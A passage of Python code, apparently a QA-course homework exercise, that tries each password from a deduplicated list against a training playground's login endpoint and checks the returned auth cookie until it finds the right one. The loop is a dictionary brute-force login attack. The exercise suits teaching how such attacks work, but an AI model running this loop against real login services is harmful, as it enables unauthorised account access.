...
unique_pass_list = list(set(pass_list))

for password in unique_pass_list:
    auth = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data={'login': login, 'password': password})
    cookies = auth.cookies.get('auth_cookie')
    check_auth = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies={'auth_cookie': cookies})
    if check_auth.text == 'You are authorized':
        print(f"Верный пароль: '{password}' - {check_auth.text}")
        break
